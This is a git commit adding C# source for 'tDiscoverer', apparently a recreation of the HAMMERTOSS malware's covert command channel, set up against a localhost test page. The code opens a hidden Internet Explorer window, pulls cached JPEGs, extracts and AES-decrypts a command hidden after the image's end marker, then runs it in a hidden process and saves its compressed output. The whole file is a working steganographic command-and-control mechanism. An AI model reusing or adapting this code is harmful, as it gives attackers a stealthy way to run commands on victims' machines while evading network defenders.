045afe5e4c2267383dc3a95050882d91ad3f4b38
Salvatore Saeli <saeli.salvatore@gmail.com>
2015-08-14 22:16:53 +0200

    hammertoss tDiscover

---
+++ tDiscoverer/HAMMERTOSS_Part_2/IECache.cs
@@ -0,0 +1,228 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Text;
+using System.IO;
+using System.Runtime.InteropServices;
+
+using FILETIME = System.Runtime.InteropServices.ComTypes.FILETIME;
+
+namespace tDiscoverer
+{
+    class IECache
+    {
+
+        #region Get Files URL From Cache
+        //Declare the WIN32 API calls to get the entries from IE's history cache  
+        [DllImport("wininet.dll", SetLastError = true)]
+        public static extern IntPtr FindFirstUrlCacheEntry(string lpszUrlSearchPattern, IntPtr lpFirstCacheEntryInfo, out UInt32 lpdwFirstCacheEntryInfoBufferSize);
+
+        [DllImport("wininet.dll", SetLastError = true)]
+        public static extern long FindNextUrlCacheEntry(IntPtr hEnumHandle, IntPtr lpNextCacheEntryInfo, out UInt32 lpdwNextCacheEntryInfoBufferSize);
+
+        [DllImport("wininet.dll", SetLastError = true)]
+        public static extern long FindCloseUrlCache(IntPtr hEnumHandle);
+
+        [DllImport("Wininet.dll", SetLastError = true, CharSet = CharSet.Auto)]
+
+        public static extern Boolean GetUrlCacheEntryInfo(String lpxaUrlName, IntPtr lpCacheEntryInfo, ref int lpdwCacheEntryInfoBufferSize);
+        [StructLayout(LayoutKind.Sequential)]
+
+        public struct INTERNET_CACHE_ENTRY_INFO
+        {
+            public UInt32 dwStructSize;
+            public string lpszSourceUrlName;
+            public string lpszLocalFileName;
+            public UInt32 CacheEntryType;
+            public UInt32 dwUseCount;
+            public UInt32 dwHitRate;
+            public UInt32 dwSizeLow;
+            public UInt32 dwSizeHigh;
+            public FILETIME LastModifiedTime;
+            public FILETIME ExpireTime;
+            public FILETIME LastAccessTime;
+            public FILETIME LastSyncTime;
+            public IntPtr lpHeaderInfo;
+            public UInt32 dwHeaderInfoSize;
+            public string lpszFileExtension;
+            public UInt32 dwExemptDelta;
+        };
+
+        public static class Hresults
+        {
+            public const int ERROR_SUCCESS = 0;
+            public const int ERROR_FILE_NOT_FOUND = 2;
+            public const int ERROR_ACCESS_DENIED = 5;
+            public const int ERROR_INSUFFICIENT_BUFFER = 122;
+            public const int ERROR_NO_MORE_ITEMS = 259;
+        };
+        //private static void getUrlEntriesInHistory(TextWriter writer)  
+        public static List<string> getUrlEntriesInHistory(string sourceUrlFilter, string fileExtensionFilter)
+        {
+            List<string> filesList = new List<string>();
+            IntPtr buffer = IntPtr.Zero;
+            UInt32 structSize;
+            const string urlPattern = "Visited:";
+
+            //This call will fail but returns the size required in structSize  
+            //to allocate necessary buffer  
+            IntPtr hEnum = FindFirstUrlCacheEntry(null, buffer, out structSize);
+            try
+            {
+                if (hEnum == IntPtr.Zero)
+                {
+                    int lastError = Marshal.GetLastWin32Error();
+                    if (lastError == Hresults.ERROR_INSUFFICIENT_BUFFER)
+                    {
+                        //Allocate buffer  
+                        buffer = Marshal.AllocHGlobal((int)structSize);
+                        //Call again, this time it should succeed  
+                        //hEnum = FindFirstUrlCacheEntry(urlPattern, buffer, out structSize);  
+                        hEnum = FindFirstUrlCacheEntry(null, buffer, out structSize);
+                    }
+                    else if (lastError == Hresults.ERROR_NO_MORE_ITEMS)
+                    {
+                        Console.Error.WriteLine("No entries in IE's history cache");
+                        //return;  
+                        return filesList;
+                    }
+                    else if (lastError != Hresults.ERROR_SUCCESS)
+                    {
+                        Console.Error.WriteLine("Unable to fetch entries from IE's history cache");
+                        //return;  
+                        return filesList;
+                    }
+                }
+
+
+                INTERNET_CACHE_ENTRY_INFO result = (INTERNET_CACHE_ENTRY_INFO)Marshal.PtrToStructure(buffer, typeof(INTERNET_CACHE_ENTRY_INFO));
+                //writer.WriteLine(result.lpszSourceUrlName);  
+                string fileUrl = result.lpszSourceUrlName.Substring(result.lpszSourceUrlName.LastIndexOf('@') + 1);
+                if (fileUrl.Contains(sourceUrlFilter) && fileUrl.EndsWith(fileExtensionFilter))
+                {
+                    //Console.WriteLine(fileUrl);
+                    filesList.Add(fileUrl);
+                }
+
+
+                // Free the buffer  
+                if (buffer != IntPtr.Zero)
+                {
+                    try { Marshal.FreeHGlobal(buffer); }
+                    catch { }
+                    buffer = IntPtr.Zero;
+                    structSize = 0;
+                }
+
+                //Loop through all entries, attempt to find matches  
+                while (true)
+                {
+                    long nextResult = FindNextUrlCacheEntry(hEnum, buffer, out structSize);
+                    if (nextResult != 1) //TRUE  
+                    {
+                        int lastError = Marshal.GetLastWin32Error();
+                        if (lastError == Hresults.ERROR_INSUFFICIENT_BUFFER)
+                        {
+                            buffer = Marshal.AllocHGlobal((int)structSize);
+                            nextResult = FindNextUrlCacheEntry(hEnum, buffer, out structSize);
+                        }
+                        else if (lastError == Hresults.ERROR_NO_MORE_ITEMS)
+                        {
+                            break;
+                        }
+                    }
+
+                    result = (INTERNET_CACHE_ENTRY_INFO)Marshal.PtrToStructure(buffer, typeof(INTERNET_CACHE_ENTRY_INFO));
+                    //writer.WriteLine(result.lpszSourceUrlName);  
+                    fileUrl = result.lpszSourceUrlName.Substring(result.lpszSourceUrlName.LastIndexOf('@') + 1);
+                    if (fileUrl.Contains(sourceUrlFilter) && fileUrl.EndsWith(fileExtensionFilter))
+                    {
+                        //Console.WriteLine(fileUrl);
+                        filesList.Add(fileUrl);
+                    }
+
+
+                    if (buffer != IntPtr.Zero)
+                    {
+                        try { Marshal.FreeHGlobal(buffer); }
+                        catch { }
+                        buffer = IntPtr.Zero;
+                        structSize = 0;
+                    }
+                }
+            }
+            finally
+            {
+                if (hEnum != IntPtr.Zero)
+                {
+                    FindCloseUrlCache(hEnum);
+                }
+                if (buffer != IntPtr.Zero)
+                {
+                    try { Marshal.FreeHGlobal(buffer); }
+                    catch { }
+                }
+            }
+            return filesList;
+        }
+
+        #endregion
+
+        const int ERROR_FILE_NOT_FOUND = 2;
+        #region Convert Files URL to Actual Directory URL
+        struct LPINTERNET_CACHE_ENTRY_INFO
+        {
+            public int dwStructSize;
+            IntPtr lpszSourceUrlName;
+            public IntPtr lpszLocalFileName;
+            int CacheEntryType;
+            int dwUseCount;
+            int dwHitRate;
+            int dwSizeLow;
+            int dwSizeHigh;
+            FILETIME LastModifiedTime;
+            FILETIME Expiretime;
+            FILETIME LastAccessTime;
+            FILETIME LastSyncTime;
+            IntPtr lpHeaderInfo;
+            int dwheaderInfoSize;
+            IntPtr lpszFileExtension;
+            int dwEemptDelta;
+        }
+        public static string GetPathForCachedFile(string fileUrl)
+        {
+            int cacheEntryInfoBufferSize = 0;
+            IntPtr cacheEntryInfoBuffer = IntPtr.Zero;
+            int lastError; Boolean result;
+            try
+            {
+                // call to see how big the buffer needs to be
+                result = GetUrlCacheEntryInfo(fileUrl, IntPtr.Zero, ref cacheEntryInfoBufferSize);
+                lastError = Marshal.GetLastWin32Error();
+                if (result == false)
+                {
+                    if (lastError == ERROR_FILE_NOT_FOUND) return null;
+                }
+                // allocate the necessary amount of memory
+                cacheEntryInfoBuffer = Marshal.AllocHGlobal(cacheEntryInfoBufferSize);
+
+                // make call again with properly sized buffer
+                result = GetUrlCacheEntryInfo(fileUrl, cacheEntryInfoBuffer, ref cacheEntryInfoBufferSize);
+                lastError = Marshal.GetLastWin32Error();
+                if (result == true)
+                {
+                    Object strObj = Marshal.PtrToStructure(cacheEntryInfoBuffer, typeof(LPINTERNET_CACHE_ENTRY_INFO));
+                    LPINTERNET_CACHE_ENTRY_INFO internetCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO)strObj;
+                    //INTERNET_CACHE_ENTRY_INFO internetCacheEntry = (INTERNET_CACHE_ENTRY_INFO)strObj;
+                    String localFileName = Marshal.PtrToStringAuto(internetCacheEntry.lpszLocalFileName); return localFileName;
+                }
+                else return null;// file not found
+            }
+            finally
+            {
+                if (!cacheEntryInfoBuffer.Equals(IntPtr.Zero)) Marshal.FreeHGlobal(cacheEntryInfoBuffer);
+            }
+        }
+        #endregion
+
+    }
+}
---
+++ tDiscoverer/HAMMERTOSS_Part_2/Program.cs
@@ -0,0 +1,354 @@
+﻿using System;
+using System.IO;
+using System.IO.Compression;
+using System.Collections.Generic;
+using System.Text;
+using System.Collections;
+using System.Threading;
+using System.Security.Cryptography;
+using System.Diagnostics;
+
+namespace tDiscoverer
+{
+    class Program
+    {
+        // change values with test web page reference and fresh salt
+        private static string _malurl = "http://127.0.0.1/projects/test/test.html";
+        private static string _pageref = "http://127.0.0.1/projects/test/";
+        private static int _offset = 91814;
+        private static string _password = "Pas5pr@se";
+        private static string _salt = "";
+
+        #region Constats
+        private const string DEFAULT_HASH_ALGORITHM = "SHA1";
+        private const int PASSWORD_ITERATIONS = 1000;
+        private const int DEFAULT_KEY_SIZE = 256;
+
+        #endregion
+
+        #region Methods
+        /**
+         *  Retrieve file from IE cache for visited web page
+         * */
+        private static List<String> getIECacheElem(String urlFilter, String fileExtensionFilter)
+        {
+            List<string> myFiles = IECache.getUrlEntriesInHistory(urlFilter, fileExtensionFilter);
+            List<string> imgPathList = new List<String>();
+            foreach (string actualPathName in myFiles)
+            {
+                string realPath = IECache.GetPathForCachedFile(actualPathName);
+                imgPathList.Add(realPath);
+            }
+            return imgPathList;
+        }
+
+        /*
+         * Convert image bytes to 16-bit integer in big endian 
+         * */
+        private static int i16(byte[] c)
+        {
+            return (c[0] << 8) | c[1];
+        }
+
+        /**
+         * Check EOI at possition (offset-2)
+         * */
+        private static bool checkEOIAtOffset(string imgpath)
+        {
+            string marker = "FFD9"; // EOI
+            bool flag = false;
+
+            int chunkSize = 2;
+            byte[] chunk = new byte[chunkSize];
+            int i16value = 0;
+            string hex = "";
+
+            using (FileStream fileReader = new FileStream(imgpath, FileMode.Open, FileAccess.Read))
+            {
+                BinaryReader binaryReader = new BinaryReader(fileReader);
+                int offsetcheck = _offset - 2;
+                binaryReader.BaseStream.Seek(offsetcheck, SeekOrigin.Begin);
+                binaryReader.Read(chunk, 0, chunkSize);
+                i16value = i16(chunk);
+                hex = i16value.ToString("X4");
+                if (hex.Equals(marker)) { flag = true; }
+                Console.WriteLine("\nMarker: {0}", hex);
+            }
+            return flag;
+        }
+
+        private static byte[] extractChipertextFromImg(string imgpath)
+        {
+            using (var file = File.OpenRead(imgpath))
+            {
+                int chunksize = (int)file.Length - _offset;
+                byte[] chunk = new byte[chunksize];
+
+                file.Position = _offset;
+                for (int i = 0; i < chunksize; i++)
+                {
+                    chunk[i] = (byte)file.ReadByte();
+                }
+                return chunk;
+            }
+        }
+
+        /**
+          * AES 256 bits dencrypt with salt
+        **/
+        public static byte[] Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes, byte[] saltBytes)
+        {
+            byte[] plainTextBytes = null;
+            ICryptoTransform decryptor = null;
+
+
+            RijndaelManaged AES = new RijndaelManaged();
+            AES.KeySize = DEFAULT_KEY_SIZE;
+            AES.Mode = CipherMode.CBC;
+
+            PasswordDeriveBytes key = new PasswordDeriveBytes(passwordBytes, saltBytes, DEFAULT_HASH_ALGORITHM, PASSWORD_ITERATIONS);
+
+            // Get Key And IV From Password And Salt
+            AES.Key = key.GetBytes(AES.KeySize / 8);
+            AES.IV = key.GetBytes(AES.BlockSize / 8);
+            decryptor = AES.CreateDecryptor();
+
+            MemoryStream memoryStream = new MemoryStream();
+            CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write);
+
+            cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
+
+            cryptoStream.FlushFinalBlock();
+            plainTextBytes = memoryStream.ToArray();
+
+            memoryStream.Close();
+            cryptoStream.Close();
+
+            return plainTextBytes;
+        }
+
+        #region String compression
+        /**
+          * ZIP and UNZIP methos for string compression
+        **/
+        public static void CopyTo(Stream src, Stream dest)
+        {
+            byte[] bytes = new byte[4096];
+
+            int cnt;
+
+            while ((cnt = src.Read(bytes, 0, bytes.Length)) != 0)
+            {
+                dest.Write(bytes, 0, cnt);
+            }
+        }
+
+        public static byte[] Zip(string str)
+        {
+            var bytes = Encoding.UTF8.GetBytes(str);
+
+            using (var msi = new MemoryStream(bytes))
+            using (var mso = new MemoryStream())
+            {
+                using (var gs = new GZipStream(mso, CompressionMode.Compress))
+                {
+                    //msi.CopyTo(gs);
+                    CopyTo(msi, gs);
+                }
+
+                return mso.ToArray();
+            }
+        }
+
+        public static string Unzip(byte[] bytes)
+        {
+            using (var msi = new MemoryStream(bytes))
+            using (var mso = new MemoryStream())
+            {
+                using (var gs = new GZipStream(msi, CompressionMode.Decompress))
+                {
+                    //gs.CopyTo(mso);
+                    CopyTo(gs, mso);
+                }
+
+                return Encoding.UTF8.GetString(mso.ToArray());
+            }
+        }
+        #endregion
+
+        #endregion
+
+        #region Main
+        static void Main(string[] args)
+        {
+
+            #region Get HTTP request
+            /**
+             * Make a request to page by nternet Explorer and put into cache all page content
+             * */
+            // Open Internet Explorer
+            Console.WriteLine("MAKE HTTP GET REQUEST: START");
+            SHDocVw.InternetExplorer ie = new SHDocVw.InternetExplorer();
+            SHDocVw.IWebBrowserApp wb = (SHDocVw.IWebBrowserApp)ie;
+            //set IE windows not visible
+            wb.Visible = false;
+
+            object noValue = System.Reflection.Missing.Value;
+            wb.Navigate(_malurl, ref noValue, ref noValue, ref noValue, ref noValue);
+
+            // Get access to its document.
+            while (wb.Busy) { Thread.Sleep(1000); }
+            Console.WriteLine("MAKE HTTP GET REQUEST: STOP");
+            Console.ReadLine();
+            #endregion
+
+            #region Info gathering from webpage Document
+            /**
+             * Get file name and size to avoid loading each image into memory 
+             * */
+            Console.WriteLine("INFO GATHERING FROM DOM: START");
+            mshtml.IHTMLDocument3 htmlDoc = wb.Document as mshtml.IHTMLDocument3;
+            mshtml.IHTMLElementCollection images = htmlDoc.getElementsByTagName("img");
+
+            Hashtable imgList = new Hashtable();
+            foreach (mshtml.IHTMLImgElement img in images)
+            {
+                imgList.Add(img.nameProp, Convert.ToInt32(img.fileSize));
+                Console.WriteLine("\nImage File Name {0}:\nImage File Size:{1}\n", img.nameProp, img.fileSize);
+            }
+            // Close Internet Explorer
+            ie.Quit();
+            Console.WriteLine("INFO GATHERING FROM DOM: STOP");
+            Console.ReadLine();
+            #endregion
+
+            #region Get image and select by filesize
+            /**
+             * Get images from IE cache  at least as large as the offset specified in the tweet
+             * */
+            Console.WriteLine("GET IMAGE FROM IE CACHE: START");
+            ArrayList matchFile = new ArrayList();
+            List<string> imgsCachePath = getIECacheElem(_pageref, "jpg");
+            foreach (string imgPath in imgsCachePath)
+            {
+                try
+                {
+                    if (File.Exists(imgPath))
+                    {
+                        foreach (string key in imgList.Keys)
+                        {
+                            int fileSize = (int)imgList[key];
+                            string nameProp = key.Replace(".jpg", "");
+                            nameProp = nameProp + "[";
+
+                            if ((fileSize >= _offset) & (imgPath.Contains(nameProp)))
+                            {
+                                Console.WriteLine("\nImage Path: {0}\nFile Size: {1}\nResearch Key: {2}\n", imgPath, fileSize, nameProp);
+                                matchFile.Add(imgPath);
+                            }
+
+                        }
+                    }
+                }
+                // if process fail than exit without signal
+                catch (IOException) { Environment.Exit(0); }
+            }
+
+            Console.WriteLine("GET IMAGE FROM IE CACHE: STOP");
+            Console.ReadLine();
+            #endregion
+
+            #region Load image and extract cyphertext
+            /**
+             * Check images for EOI marker at (offset-2)
+             **/
+            Console.WriteLine("CHECK IMAGES FOR EOI MARKER AT (OFFSET-2): START");
+            int pos = 0;
+            bool match = false;
+            for (int i = 0; i < matchFile.Count; i++)
+            {
+                string imagepath = (string)matchFile[i];
+                if (checkEOIAtOffset(imagepath))
+                {
+                    pos = i;
+                    match = true;
+                }
+            }
+
+            string stegaimg = "";
+            if (match)
+            {
+                stegaimg = (string)matchFile[pos];
+                Console.WriteLine("Selected IMG:\n{0}\n", stegaimg);
+            }
+            else
+            {
+                Console.WriteLine("No Match!");
+                Environment.Exit(0);
+            }
+
+            Console.WriteLine("CHECK IMAGES FOR EOI MARKER AT (OFFSET-2): STOP");
+            Console.ReadLine();
+
+            /**
+              * Extract chipertext from image
+            **/
+            Console.WriteLine("EXTRACT CHIPERTEXT: START");
+            // Get the bytes of the string
+            byte[] passwordBytes = Encoding.ASCII.GetBytes(_password);
+            byte[] saltBytes = Encoding.ASCII.GetBytes(_salt);
+            byte[] chipertext = extractChipertextFromImg(stegaimg);
+
+            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
+            byte[] plaintext = Decrypt(chipertext, passwordBytes, saltBytes);
+
+            Console.WriteLine("\nDecrypt : {0}\n", Encoding.ASCII.GetString(plaintext));
+            Console.WriteLine("EXTRACT CHIPERTEXT: STOP");
+            Console.ReadLine();
+            #endregion
+
+            #region Command Execution and std_out grabbing
+            /**
+              * Execution of win command into hiden command prompt and std_out grabbing
+             **/
+            string wincmq = Encoding.ASCII.GetString(plaintext);
+
+            ProcessStartInfo procStartInfo = new ProcessStartInfo(wincmq);
+            procStartInfo.RedirectStandardError = false;
+            procStartInfo.RedirectStandardOutput = true; // Set true to redirect the process stdout to the Process.StandardOutput StreamReader
+            procStartInfo.UseShellExecute = false;
+            procStartInfo.CreateNoWindow = true;          // Do not create the black window
+
+            // Create a process, assign its ProcessStartInfo and start it
+            Process proc = new Process();
+            proc.StartInfo = procStartInfo;
+            proc.Start();
+
+            // Dump the o utput to the log file
+            string std_out = proc.StandardOutput.ReadToEnd();
+            proc.WaitForExit();
+
+            FileStream file_writer = null;
+            // Save uncompressed string into a file 
+            string file_out = "output.txt";
+            file_writer = new FileStream(file_out, FileMode.OpenOrCreate, FileAccess.Write);
+            StreamWriter streamWriter = new StreamWriter(file_writer);
+            streamWriter.Write(std_out);
+            Console.WriteLine("\nNO UPX File Size: {0}", file_writer.Length);
+            file_writer.Close();
+
+            // Save compressed string into a file 
+            byte[] std_out_upx = Zip(std_out); // String compression
+
+            file_out = "output_upx.txt";
+            file_writer = new FileStream(file_out, FileMode.OpenOrCreate, FileAccess.Write);
+            file_writer.Write(std_out_upx, 0, std_out_upx.Length);
+            Console.WriteLine("\nUPX File Size: {0}", file_writer.Length);
+            file_writer.Close();
+
+            Console.ReadLine();
+            #endregion
+        }
+        #endregion
+    }
+}
